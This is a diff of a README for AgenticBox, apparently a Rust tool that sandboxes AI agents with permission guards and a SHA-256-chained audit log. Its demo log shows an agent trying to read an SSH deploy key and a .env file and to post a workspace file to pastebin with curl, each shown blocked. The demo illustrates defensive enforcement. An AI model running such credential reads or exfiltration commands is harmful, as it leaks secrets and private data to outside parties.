@@ -1,6 +1,7 @@
-# AgenticBox
+# AgenticBox — The Agent Governance Platform
 
-> **Deploy AI agents into production — safely.** Scoped permissions, bounded execution, full audit trail. Open source. Local-first.
+> **Run autonomous agents that touch real systems — without the nightmare.**
+> Scoped permissions, bounded execution, full audit trail. Every tool call logged in real-time. Open source. Local-first.
 
 [![License](https://img.shields.io/badge/License-MIT%20OR%20Apache--2.0-blue.svg)](LICENSE.md)
 [![Rust](https://img.shields.io/badge/Rust-1.75%2B-orange.svg)](https://rustup.rs)
@@ -8,52 +9,159 @@
 
 ---
 
-## What Is This?
+## See It In Action
 
-Every company wants agents that do real work — touch real customer data, take real actions, move real money. But deploying an agent into production today means either building custom guardrails from scratch or handing it the keys and hoping for the best.
-
-AgenticBox makes that a solved problem. It's the infrastructure layer for agent deployment: pick a vertical template, connect your tools, set what the agent is allowed to do, and deploy into production — with scoped permissions, bounded execution, and full accountability built in.
-
-The rest follows from that:
-
-- **Permissions** — what the agent is allowed to do
-- **Accountability** — what the agent did
-- **Ownership boundaries** — what belongs to the agent vs. the organization
-- **Identity** — who the agent is (emerging)
-
-```
-┌─────────────────────────────────────────────────────┐
-│                  AgenticBox                          │
-├─────────────────────────────────────────────────────┤
-│                                                      │
-│   agenticbox run <agent>                             │
-│        │                                             │
-│        ▼                                             │
-│   ┌──────────┐    ┌──────────────┐                  │
-│   │  CLI     │───▶│  Docker      │                  │
-│   │          │    │  Container   │                  │
-│   │  relay   │◄──▶│  (sandbox)   │                  │
-│   └──────────┘    └──────┬───────┘                  │
-│                          │                          │
-│                    ┌─────┴──────┐                   │
-│                    │ Agent CLI  │                   │
-│                    │ runs here  │                   │
-│                    │ /workspace │                   │
-│                    └────────────┘                   │
-│                                                      │
-└─────────────────────────────────────────────────────┘
+```bash
+# This is the viral moment — watch the permission log in real-time
+agenticbox run demo
 ```
 
-The agent CLI runs **inside** a sandboxed container. The host relays stdin/stdout. No pre-built images per agent — agents install at runtime from a TOML profile.
+```
+┌─ TASK: Deploy /workspace/deploy.sh to production
+│
+ AGENT → cat /workspace/deploy.sh
+│ #!/bin/bash
+│ # Production deployment script
+│ set -euo pipefail
+│ echo "Building application..."
+│ npm run build
+  ✓ ALLOWED → within permissions
 
-### The Four Pillars
+ AGENT → cat ~/.ssh/deploy_key  # need this to deploy
+  ✗ BLOCKED → filesystem: path outside workspace
 
-| Pillar | What it means |
-|--------|---------------|
-| **Permissions** | Terminal, filesystem, network, browser — scoped and enforced. The agent can only do what it's authorized to do. |
-| **Accountability** | Every action attributed, logged, auditable. Full audit trail. |
-| **Ownership Boundaries** | Clear boundaries: resources, outputs, budgets, assets. What belongs to the agent vs. the org. |
-| **Identity** | Agents get their own credentials, accounts, digital identity — provisioned and revocable. *(Emerging moat.)* |
+ AGENT → curl -X POST https://pastebin.com/api --data @/workspace/deploy.sh
+  ✗ BLOCKED → network: https://pastebin.com/api not in allowlist
+
+ AGENT → cat /workspace/.env  # need DB connection string
+  ✗ BLOCKED → filesystem: path outside workspace
+
+ AGENT → bash /workspace/deploy.sh
+  → Build complete. Tests passed. Artifact: dist.tar.gz
+  ✓ ALLOWED → within permissions
+
+ AGENT → POST https://api.github.com/repos/acme/app/releases  # upload artifact
+  → {"id": 42, "url": "https://github.com/acme/app/releases/42"}
+  ✓ ALLOWED → within permissions
+
+━━━ Workplace Session Summary ━━━
+  ✓ Ran deploy.sh — build, test, artifact created
+  ✓ Uploaded release artifact to github.com/acme/app
+
+  3 blocked: SSH key access, .env read, pastebin exfil attempt
+
+The agent did its job. The workplace did its job.
+```
+
+Every one of those Allow/Deny decisions is written to a **tamper-evident audit log** — a SHA-256 chained JSONL file that no one, not even root, can modify without detection:
+
+```bash
+$ agenticbox audit --summary
+
+Audit Log Summary
+──────────────────────────────────────────
+  ✓ 32 allowed
+  ✗ 24 blocked
+  • 56 total
+
+  Log file: ~/.local/share/agenticbox/audit.log
+
+$ agenticbox audit --verify
+
+  ✓ Audit chain verified — 56 entries, no tampering detected
+```
+
+That's the whole pitch: **your agent tries something dangerous → we catch it before it happens → you see exactly what was blocked and why → every decision is permanently on the record.** No guessing. No post-mortems. Just clean, deterministic enforcement with a tamper-evident trail.
+
+[Record the demo →](#quick-start)
+
+---
+
+## What Is AgenticBox?
+
+Every company wants agents that do real work — touch customer data, take real actions, move real money. The problem isn't building agents; it's trusting them.
+
+Deploying an agent into production today means either:
+- **Building custom guardrails from scratch** — every team reinvents the permission layer
+- **Handing it the keys and hoping** — full filesystem, full network, no audit trail
+- **Locking it in a sandbox with no governance** — isolated but useless, or capable but ungoverned
+
+AgenticBox is the layer between "agent built" and "agent deployed in production touching real systems." It's the infrastructure for governing what agents are allowed to do — with deterministic policies, real-time enforcement, and full accountability.
+
+| Instead of this | You get this |
+|---|---|
+| An agent with root access to your production environment | An agent with a **job description and a badge** — scoped by role |
+| Finding out after the breach | **Real-time ALLOWED/BLOCKED** — every action attributed |
+| Building your own audit system | **Full audit trail** — every session logged, replayable |
+| Picking one framework and getting locked in | **Framework-agnostic** — govern LangGraph, CrewAI, OpenAI, or custom agents with the same tool |
+| Trusting an LLM to "be good" | **Deterministic policies enforced in Rust** — the AI layer can't bypass them |
+
+**The thesis:** Agents are employees; workplaces are infrastructure. You wouldn't give a new hire root access on day one. Why would you give it to an AI?
+
+---
+
+## Quick Start
+
+### Prerequisites
+
+- **Rust 1.75+** — [install via rustup](https://rustup.rs)
+
+> That's all you need for the demo. Docker and an LLM API are only required for
+> container mode (`agenticbox run -- cmd`) and builtin agent mode (`agenticbox run hermes`).
+
+### Build
+
+```bash
+git clone https://github.com/morpheus-sh/agenticbox.git
+cd agenticbox
+cargo build --release --bin agenticbox
+```
+
+### See it work in 10 seconds
+
+```bash
+# Built-in permission guard demo — real FsGuard + NetworkGuard enforcement.
+# No Docker, no API keys, no daemon needed.
+./target/release/agenticbox run demo
+```
+
+### Run a real agent (requires Docker)
+
+```bash
+# Run a named agent — auto-fetches from the registry if not installed locally
+./target/release/agenticbox run security-analyst
+
+# Preview permissions without executing
+./target/release/agenticbox run security-analyst --dry-run
+
+# Or wrap any command ad-hoc
+./target/release/agenticbox run -- python3 -c "print('sandboxed!')"
+```
+
+> **Builtin agent mode** (no Docker): set up a local LLM via `agenticbox setup`,
+> then run `agenticbox run security-analyst`. Uses the agent-loop crate with
+> any OpenAI-compatible API (LM Studio, Ollama, OpenRouter, etc.).
+
+### Verify the audit trail
+
+```bash
+# Every run writes Allow/Deny decisions to a tamper-evident audit log
+./target/release/agenticbox audit --summary    # show allow/deny counts
+./target/release/agenticbox audit --verify     # verify chain integrity
+```
+
+---
+
+## The Four Pillars
+
+AgenticBox governs agents through four primitives — the minimum set an enterprise needs to trust an agent in production:
+
+| Pillar | What it means | Why it matters |
+|--------|---------------|----------------|
+| **Permissions** | Terminal, filesystem, network, browser — scoped and enforced via deterministic TOML policy. The agent can only do what it's authorized to do. | **Deterministic floor.** Declared in TOML, enforced in Rust. The AI layer can suggest; the policy layer decides. An LLM hallucination can't bypass a `filesystem = "readonly"` rule. |
+| **Accountability** | Every action attributed, logged, auditable. Tamper-evident audit trail with SHA-256 chain hashing — each entry links to the previous entry's hash, so any modification is immediately detectable. Query with `agenticbox audit`, verify integrity with `agenticbox audit --verify`. | **Who did what, when, and was it allowed?** Enterprises need this for compliance, incident response, and procurement. The audit log is the compliance cornerstone — CISOs need to see a tamper-evident trail, and now it exists. |
+| **Ownership Boundaries** | Clear boundaries on resources, outputs, budgets, and assets. What belongs to the agent vs. the organization. | **No ghost bills, no leaked IP.** Each agent gets a bounded scope — files it can write, APIs it can call, storage it can use. |
+| **Identity** | Agents get their own credentials, accounts, and digital identity — provisioned and revocable, just like a human employee. `agenticbox identity` CLI for create/list/revoke, `agenticbox credentials` for encrypted credential management. | **The moat.** When every agent has its own API key, SSH credential, and service account, you can audit, revoke, and rotate independently. No shared secrets. |
 
 ---
 
@@ -70,102 +178,22 @@ The agent CLI runs **inside** a sandboxed container. The host relays stdin/stdou
 | **Filesystem Governance** | ✅ Path resolution with escape prevention, protected paths (SSH keys, AWS creds) |
 | **Network Control** | ✅ Domain allowlist enforcement |
 | **Agent Packages** | ✅ TOML manifests with `[image]` section for container + install steps |
-| **Built-in Demo** | ✅ `agenticbox run demo` — scripted permission guard showcase |
-| **Session Management** | ⚠️ SQLite-backed, exists but daemon doesn't create containers yet |
+| **Auto-Fetch Registry** | ✅ `agenticbox run <name>` auto-fetches from GitHub registry if not installed locally |
+| **Dry-Run Mode** | ✅ `agenticbox run <name> --dry-run` — preview permissions without executing |
+| **Tamper-Evident Audit Log** | ✅ `agenticbox audit` — SHA-256 chained JSONL, `--verify` for tamper detection, `--summary` for counts |
+| **Built-in Demo** | ✅ `agenticbox run demo` — scripted permission guard showcase with audit logging |
+| **Session Management** | ✅ SQLite-backed session tracking with identity attribution |
+| **Agent Identity** | ✅ `agenticbox identity` — create, list, revoke identities with encrypted credential storage |
+| **Audit Log Rotation** | ✅ Automatic by size/age, manual via `agenticbox audit --rotate` |
+| **Web Dashboard** | ✅ `agenticbox dashboard` — local HTTP server with REST API and visual audit log viewer |
 | **Desktop Console** | ⚠️ Tauri v2 app exists, needs integration with new container runtime |
 | **ACP Permission Interception** | 🔵 Next — parse JSON-RPC, block/allow tool calls |
-| **Agent Identity** | 🔵 Future — agents get own credentials, provisioned and revocable |
-
----
-
-## Quick Start
-
-### Prerequisites
-
-- **Rust 1.75+** (to build from source)
-- **Docker** (Docker Desktop on macOS/Windows, Docker CE on Linux/WSL) — only for container mode
-- **LM Studio** or any OpenAI-compatible API — for builtin agent mode (local LLM)
-
-### Build from source
-
-```bash
-git clone https://github.com/morpheus-sh/agenticbox.git
-cd agenticbox
-cargo build --release
-```
-
-The binary will be at `target/release/agenticbox`.
-
-### Configure LLM inference
-
-```bash
-agenticbox setup
-```
-
-Auto-detects LM Studio running locally. If not found, prompts for a provider (OpenRouter, OpenAI, custom endpoint). Saves to `~/.agenticbox/config.toml`.
-
-### See it work immediately
-
-```bash
-# Built-in permission guard demo
-./target/release/agenticbox run demo
-
-# Security analyst — AI-powered malware analysis (needs `agenticbox setup` first)
-cp -r agents/security-analyst ~/.agenticbox/agents/
-./target/release/agenticbox run security-analyst
-
-# Ad-hoc command in a container
-./target/release/agenticbox run -- python3 -c "print('sandboxed!')"
-```
-
----
-
-## Running Agents
-
-The `agenticbox run` command is the primary interface. Like `docker run <image>` → `agenticbox run <agent>`.
-
-### Ad-hoc Commands
-
-```bash
-agenticbox run -- python3 script.py
-agenticbox run -- npm test
-agenticbox run -- make build
-```
-
-Wraps any command in a sandboxed Docker container. Defaults: `terminal=on`, `fs=readonly`, `network=allowlist`.
-
-### Named Agents
-
-```bash
-agenticbox run security-analyst   # AI-powered malware analysis (builtin mode)
-agenticbox run pi                 # Pi coding agent (container mode)
-agenticbox run hermes             # Hermes agent (container mode)
-```
-
-Reads the agent profile from `~/.agenticbox/agents/<name>/agent.toml`. In `builtin` mode, stages workspace files and runs the agent-loop crate with the configured LLM. In `container` mode, pulls a base image, installs the agent at runtime, and launches it with interactive stdio relay.
-
-### Built-in Demo
-
-```bash
-agenticbox run demo
-```
-
-Runs a scripted permission guard demo — an agent tries to read SSH keys, exfiltrate data, write to system paths, and each attempt is caught or allowed in real-time.
-
-### Installing Agent Profiles
-
-Copy the example profiles from this repo:
-
-```bash
-mkdir -p ~/.agenticbox/agents
-cp -r agents/* ~/.agenticbox/agents/
-```
 
 ---
 
 ## Agent Profiles
 
-Agents are TOML manifests in `~/.agenticbox/agents/<name>/agent.toml`. They define a **role** — which agent to use, which LLM, what permissions, what toolchain:
+Agents are TOML manifests — like Docker images, but for agent roles. Define the agent, the LLM, the permissions, and the runtime environment in one file.
 
 ```toml
 # ~/.agenticbox/agents/security-analyst/agent.toml
@@ -174,11 +202,11 @@ description = "Security Analyst — sandboxed malware analysis, RE, threat resea
 
 [model]
 provider = "local"          # resolved via `agenticbox setup`
-model = ""                  # empty = use config from setup
+model = ""
 
 [permissions]
 terminal = true
-filesystem = "readwrite"
+filesystem = "readwrite"    # needs to read/write analysis samples
 browser = false
 network = "offline"         # no C2 callbacks during analysis
 domains = []
@@ -198,50 +226,129 @@ files = [
 ]
 ```
 
-### Execution Modes
+### Permissions at a glance
 
-| Mode | Description | Requires |
-|------|-------------|----------|
-| `builtin` | Agent-loop crate talks to local/cloud LLM directly. No Docker needed. | LLM endpoint (LM Studio, OpenRouter, etc.) |
-| `container` | Full Docker isolation. Agent CLI installed at runtime inside container. | Docker |
+| Field | Type | Values | Default | Description |
+|-------|------|--------|---------|-------------|
+| `terminal` | bool | `true` / `false` | `true` | Shell command execution |
+| `filesystem` | string | `readonly` / `readwrite` / `none` | `readonly` | File system access level |
+| `browser` | bool | `true` / `false` | `false` | Headless browser automation (Phase 2) |
+| `network` | string | `allowlist` / `localhost` / `offline` / `full` | `allowlist` | Outbound network policy |
+| `domains` | array | `["api.openai.com"]` | — | Allowed domains when `network = "allowlist"` |
 
-Omit `[execution]` to default to `container` mode (backwards compatible with existing `pi`/`hermes` profiles).
-
-### Managing Agents
+CLI overrides let you tighten or loosen per-run without editing the manifest:
 
 ```bash
-agenticbox agents                # list available agents
-agenticbox agents --paths        # show config directory
-agenticbox init my-agent         # create a new agent manifest
+agenticbox run hermes --fs readwrite --network full --terminal false
 ```
 
 See [`docs/agents.md`](docs/agents.md) for the full agent manifest reference.
 
 ---
 
+## How It Works
+
+```
+┌────────────────────────────────────────────────────────────┐
+│                     How `agenticbox run` works               │
+├────────────────────────────────────────────────────────────┤
+│                                                            │
+│  1. Read agent.toml → image base + setup + agent command   │
+│  2. docker create (base image, mount cwd, env vars)        │
+│  3. docker start                                           │
+│  4. For each [image].setup command: docker exec (install)  │
+│  5. docker exec -it (agent command) — stdio relay          │
+│                                                            │
+│     ┌──────────┐    ┌──────────────┐    ┌─────────────┐   │
+│     │  CLI     │───▶│  Container   │───▶│  Agent CLI  │   │
+│     │  relay   │◄──▶│  (sandbox)   │◄──▶│  runs here  │   │
+│     │  stdio   │    │  /workspace  │    │  governed   │   │
+│     └──────────┘    └──────┬───────┘    └─────────────┘   │
+│                            │                               │
+│                    Permission Guards                         │
+│                    ├─ fs-guard (path resolution)            │
+│                    ├─ network-control (allowlist)           │
+│                    └─ terminal (exec enforcement)           │
+│                                                            │
+│  6. On exit: docker stop + docker rm                       │
+│  7. Audit log written to ~/.agenticbox/sessions/           │
+│                                                            │
+└────────────────────────────────────────────────────────────┘
+```
+
+**No daemon required for `run`.** The CLI talks directly to your container runtime via [bollard](https://github.com/fussybeaver/bollard-rust). Docker and Podman are both supported (auto-detected). Set `AGENTICBOX_CONTAINER_SOCKET=/path/to/socket` to override.
+
+The daemon is only needed for persistent, background sessions (`agenticbox deploy`).
+
+---
+
+## Why Not Just Use Docker / E2B / LangGraph / OpenAI?
+
+Every alternative solves one part of the problem; you'd need to assemble the rest yourself.
+
+| Capability | AgenticBox | Docker/K8s | E2B | LangGraph/CrewAI | OpenAI Assistants |
+|---|---|---|---|---|---|
+| Sandboxed execution | ✅ Docker/Podman | ✅ Containers | ✅ Firecracker | ❌ | ⚠️ (on their side) |
+| **Deterministic permissions** | ✅ TOML policies in Rust | ❌ | ❌ | ❌ | ❌ |
+| **Audit trail (agent actions)** | ✅ Tamper-evident, SHA-256 chained | ❌ Container logs only | ⚠️ Exec logs | ❌ | ⚠️ Their logs |
+| Vertical templates | ✅ Security analyst + support agent + ops/SRE | ❌ | ❌ | ❌ | ❌ |
+| **Agent identity** | ✅ `agenticbox identity` — create, list, revoke identities with encrypted credential storage | ❌ | ❌ | ❌ | ❌ |
+| Model-agnostic | ✅ Any LLM | n/a | ✅ | ✅ | ❌ OpenAI only |
+| Local-first / self-hosted | ✅ | ✅ | ✅ (self-host) | ✅ | ❌ |
+| Framework-agnostic | ✅ Governs any agent | ✅ | ✅ | n/a (it's the framework) | ⚠️ |
+
+**Our wedge:** Everyone gives you a sandbox or a framework and says "build your own policy." We ship governance as a product — declared permissions, deterministic enforcement, full audit trails. That's what enterprises buy.
+
+---
+
 ## CLI Reference
 
 ```bash
-# Run agents
+# Run
 agenticbox run demo                    # built-in permission guard demo
-agenticbox run pi                      # named agent from manifest
+agenticbox run security-analyst        # named agent (auto-fetches from registry if not installed)
+agenticbox run security-analyst --dry-run  # preview permissions without executing
 agenticbox run -- python3 script.py    # ad-hoc command wrapping
+
+# Audit
+agenticbox audit                       # view recent permission decisions
+agenticbox audit --summary             # show allow/deny counts
+agenticbox audit --verify              # verify tamper-evident chain integrity
+agenticbox audit --agent hermes        # filter by agent name
+agenticbox audit --path                # show audit log file location
+agenticbox audit --json                # machine-parseable JSON output
+agenticbox audit --rotate              # manually rotate the audit log
+
+# Identity
+agenticbox identity create <name>      # create a new agent identity
+agenticbox identity list               # list all identities
+agenticbox identity status <name>      # show identity details
+agenticbox identity revoke <name>      # revoke an identity
+agenticbox credentials set <identity> <name>  # set encrypted credential
+agenticbox credentials list <identity> # list credential names
+agenticbox credentials rotate <identity> <name>  # rotate credential
+agenticbox credentials revoke <identity> <name>  # revoke credential
+
+# Dashboard
+agenticbox dashboard                 # launch local web dashboard
 
 # Manage
 agenticbox agents                      # list available agents
 agenticbox init my-agent               # create new agent manifest
+agenticbox setup                       # configure LLM inference
 agenticbox list                        # list sessions (daemon mode)
-agenticbox get <SESSION_ID>            # session details
 agenticbox logs <SESSION_ID> -f        # stream logs
 agenticbox stop <SESSION_ID>           # stop session
 agenticbox health                      # health check
 ```
 
+### Runtime overrides
+
 | Flag | Description | Default |
 |------|-------------|---------|
 | `--terminal` | Enable terminal access | `true` |
-| `--fs` | Filesystem permission: readonly, readwrite, none | `readonly` |
-| `--network` | Network policy: allowlist, localhost, offline, full | `allowlist` |
+| `--fs` | Filesystem: readonly, readwrite, none | `readonly` |
+| `--network` | Network: allowlist, localhost, offline, full | `allowlist` |
 | `--domains` | Allowed domains (comma-separated) | `api.openai.com,github.com` |
 | `--browser` | Enable browser automation | `false` |
 
@@ -249,28 +356,19 @@ agenticbox health                      # health check
 
 ## Architecture
 
-### How `run` works
-
-```
-1. Read agent.toml → get image base + setup commands + agent command
-2. docker create (base image, sleep infinity, mount cwd → /workspace, env vars)
-3. docker start
-4. for each setup command: docker exec (install agent)
-5. docker exec -it (agent command) ← interactive stdio relay
-6. host stdin → container stdin, container stdout → host stdout
-7. on exit: docker stop + docker rm
-```
-
-**No daemon required for `run`.** The CLI talks directly to your container runtime via [bollard](https://github.com/fussybeaver/bollard-rust). Docker and Podman are both supported (auto-detected at startup). Set `AGENTICBOX_CONTAINER_SOCKET=/path/to/socket` to override. The daemon is only needed for persistent, background sessions (`deploy`).
-
 ### Crates (Rust)
 
 | Crate | Purpose |
 |-------|---------|
 | `sandbox-core` | Docker container lifecycle: create/start/stop/remove, exec (interactive + wait), log streaming, image pull |
-| `fs-guard` | Filesystem path resolution with escape prevention |
-| `shared-types` | Common types: Session, ModelConfig, PermissionSet |
-| `network-control` | Network policy enforcement (allowlist/localhost/offline) |
+| `fs-guard` | Filesystem path resolution with escape prevention — canonicalizes paths, prevents `../` and symlink attacks |
+| `network-control` | Network policy enforcement (allowlist/localhost/offline) — only whitelisted domains pass |
+| `shared-types` | Common types: Session, ModelConfig, PermissionSet, AgentIdentity |
+| `policy-engine` | Deterministic policy evaluation — Allow/Deny decisions with structured reasons |
+| `audit-log` | Tamper-evident JSONL audit log with SHA-256 chain hashing, rotation, and verification |
+| `session-manager` | SQLite-backed session tracking, identity management, credential storage |
+| `agent-loop` | Builtin agent mode — local LLM inference loop with tool call governance |
+| `tool-protocol` | MCP tool protocol parsing and enforcement |
 
 ### Apps
 
@@ -283,32 +381,41 @@ agenticbox health                      # health check
 ### Design Docs
 
 - [`docs/designs/dx-user-journey.md`](docs/designs/dx-user-journey.md) — The three modes (ad-hoc, named agent, daemon), container lifecycle, ACP transport decisions
+- [`docs/competitive-analysis.md`](docs/competitive-analysis.md) — Full landscape map: E2B, Modal, Daytona, Docker, OpenAI, LangGraph, Anthropic, Browserbase, Cloudflare
 
 ---
 
 ## Roadmap
 
 ### Now ✅
-Core deployment engine — `agenticbox run` spawns bounded containers, installs agents at runtime, relays interactive stdio with PTY support. Scoped permissions enforced at the runtime boundary.
+Core deployment engine — `agenticbox run` spawns bounded containers, installs agents at runtime, relays interactive stdio with PTY support. Scoped permissions enforced at the runtime boundary. Tamper-evident audit logging with SHA-256 chain hashing. Auto-fetch from package registry. Dry-run mode for permission previews.
 
 ### Next 🟡
-First vertical template — customer support agent (helpdesk connector + tuned permission profile). ACP permission interception on tool calls. The `create-next-app` moment for AI agents.
+- ACP permission interception — parse JSON-RPC tool calls, enforce allow/deny at the protocol level
+- Agent install caching — named volumes for npm/pip cache (no more 3-minute installs every run)
+- Browser automation with governed scopes
+- Persistent sessions — `agenticbox deploy` for long-running agents
+- Waitlist → beta onboarding for managed cloud
 
 ### Later 🔵
-More verticals — sales ops, IT ops, finance ops. Agent identity: agents get their own credentials and accounts. Browser automation. The path from developer tool to infrastructure company.
+- More verticals — sales ops, IT ops, finance ops, legal ops
+- Firecracker microVMs for stronger isolation
+- Managed cloud with SSO, RBAC, VPC
+- Multi-agent coordination
+- The path from developer tool to infrastructure company
 
 ---
 
 ## Development
 
 ```bash
-# Build
+# Quick build
 cargo build
 
-# Run tests
+# Run all tests
 cargo test --workspace
 
-# Run ad-hoc test
+# Run specific test
 cargo run -p agenticbox-cli -- run -- echo "test"
 ```
 
@@ -316,6 +423,13 @@ cargo run -p agenticbox-cli -- run -- echo "test"
 ```bash
 export PATH="/c/Program Files (x86)/Microsoft Visual Studio/2022/BuildTools/VC/Tools/MSVC/<version>/bin/Hostx64/x64:$PATH"
 ```
+
+### Scripts
+
+| Script | Purpose |
+|--------|---------|
+| `scripts/dev.sh` | Full dev stack (daemon + agent-runtime + desktop) |
+| `.github/workflows/ci.yml` | Runs fmt → clippy → build → test on every push/PR |
 
 ---
 
@@ -333,4 +447,4 @@ export PATH="/c/Program Files (x86)/Microsoft Visual Studio/2022/BuildTools/VC/T
 
 ---
 
-> **AgenticBox** — Deploy agents into production — safely.
+> **AgenticBox** — Run autonomous agents that touch real systems — without the nightmare.
